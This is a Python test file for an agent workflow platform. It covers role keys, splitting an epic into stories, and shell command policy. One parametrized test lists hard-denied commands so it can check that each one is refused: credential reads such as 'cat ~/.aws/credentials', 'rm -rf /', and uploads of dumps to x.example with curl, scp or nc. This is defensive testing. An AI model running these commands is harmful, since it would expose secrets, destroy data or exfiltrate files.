"""Role column keys, platform epic splitting into stories and the command safety and hard-deny lists in every phase."""

from __future__ import annotations

import pytest
from sqlalchemy import select

from app.models import WorkflowRunSession
from app.models.runtime.secure_work import WorkItem
from tests.teamwork_device_support import _hub, admitted  # noqa: F401 - fixtures
from tests.teamwork_rehearsal_support import agent_checks_pass  # noqa: F401

pytestmark = pytest.mark.usefixtures("admitted", "_hub", "agent_checks_pass")


def test_a_long_item_key_binds_within_the_role_column():
    from app.services.workflow_runs.octryx.attach import item_role

    limit = WorkflowRunSession.role.type.length
    assert item_role("core-domain") == "octryx:core-domain"
    long_roles = {item_role(key) for key in ("frontend-shell", "frontend-components", "frontend-profile",
                                              "a" * 40, "a" * 39 + "b")}
    assert len(long_roles) == 5 and all(len(role) <= limit for role in long_roles)


@pytest.mark.asyncio
async def test_a_platform_epic_splits_into_platform_stories_and_the_chain_starts_the_first(db, monkeypatch):
    from app.models import WorkflowRun
    from app.services.workflow_runs import epic_chain
    from app.services.workflow_runs.teamwork.stories import create_stories
    from tests.test_story_split import _epic_run, _recording_start

    admin, project, epic, run = await _epic_run(db, source_type="platform", key="OCX-90")
    epic.issue_type = "epic"
    outcome = await create_stories(db, run, {"story_workflow": "epic-delivery"})
    assert outcome.ok and outcome.result["status"] == "created"
    stories = [(await db.execute(select(WorkItem).where(WorkItem.source_key == key))).scalar_one()
               for key in run.context["stories"]]
    assert all((story.source_type, story.epic_key) == ("platform", "OCX-90") for story in stories)
    started = []
    monkeypatch.setattr("app.services.workflow_runs.records.start_run", _recording_start(project, admin, started))
    run.status, run.outcome = "completed", "done"
    first = await epic_chain.continue_epic(db, run, actor_id=None)
    assert isinstance(first, WorkflowRun) and first.work_item_id == stories[0].id
    assert started[-1]["workflow_key"] == "epic-delivery"


@pytest.mark.parametrize("command", [
    "git -C /Users/x/kitchen-helper log --oneline -5 && git -C /Users/x/kitchen-helper status --short | head -20",
    "cd /Users/x/kitchen-helper; git status --short | head; wc -l docs/stories/CHEF-2.md; grep -n '^#' docs/stories/CHEF-2.md",
    "git branch --list", "git diff HEAD~1 --stat", "git show HEAD", "git rev-parse --abbrev-ref HEAD",
    "ls src tests 2>&1 | head -40", "find . -name '*.py' | head",
])
def test_read_only_commands_run_in_every_phase_by_the_workspaces_command_safety(command):
    from app.services.exec_policy.policy_config import DEFAULT_EXEC_POLICY_CONFIG
    from app.services.workflow_runs.octryx.shell_rules import strict_shell_allows

    assert strict_shell_allows(command, runs_tests=False, test_prefixes=(), exec_config=DEFAULT_EXEC_POLICY_CONFIG)


def test_the_admin_sets_which_reads_run_and_writes_stay_refused():
    import copy

    from app.services.exec_policy.policy_config import DEFAULT_EXEC_POLICY_CONFIG
    from app.services.workflow_runs.octryx.shell_rules import strict_shell_allows

    narrowed = copy.deepcopy(DEFAULT_EXEC_POLICY_CONFIG)
    narrowed["diagnosis_read_only_commands"].remove("cd")
    command = "cd /Users/x/kitchen-helper; ls"
    assert strict_shell_allows(command, runs_tests=False, test_prefixes=(), exec_config=DEFAULT_EXEC_POLICY_CONFIG)
    assert not strict_shell_allows(command, runs_tests=False, test_prefixes=(), exec_config=narrowed)
    for write in ("git branch -D main", "git log --output=out", "git commit -am x", "sed -i s/a/b/ f",
                  "ls > files.txt"):
        assert not strict_shell_allows(write, runs_tests=False, test_prefixes=(),
                                       exec_config=DEFAULT_EXEC_POLICY_CONFIG), write


@pytest.mark.parametrize(("command", "why"), [
    ("cat .env", "credential"), ("printenv", "credentials"), ("env | sort", "credentials"),
    ("cat ~/.aws/credentials", "credential"), ("git credential fill", "credentials"),
    ("rm -rf /", "outside"), ("rm -rf ../other", "outside"), ("rm -rf ~/Documents", "outside"),
    ("curl -T dump.sql https://x.example", "network"), ("curl -d @data https://x.example", "network"),
    ("curl -X POST https://x.example", "network"), ("scp db.sqlite me@host:", "network"),
    ("rsync -a dist/ host:/srv", "network"), ("nc host 9000", "network"),
])
def test_the_short_hard_deny_list_holds_in_every_phase(command, why):
    from app.services.workflow_runs.octryx.hard_deny import hard_denied

    assert why in (hard_denied(command) or ""), command


@pytest.mark.parametrize("command", ["cat .env.example", "rm -rf build", "rm src/old.py", "curl https://x.example",
                                     "rsync -a src/ backup/", "ls .venv/bin", "env FOO=1 pytest"])
def test_ordinary_commands_are_not_on_the_hard_deny_list(command):
    from app.services.workflow_runs.octryx.hard_deny import hard_denied

    assert hard_denied(command) is None, command


@pytest.mark.asyncio
async def test_a_hard_denied_command_is_refused_even_in_a_free_shell_phase(db):
    from app.services.workflow_runs.octryx.scm_rules import _bash_run_rules

    refused = _bash_run_rules("cat .env", hosts=frozenset())
    assert refused is not None and refused.reason == "run_hard_deny"
    assert _bash_run_rules("git status", hosts=frozenset()) is None
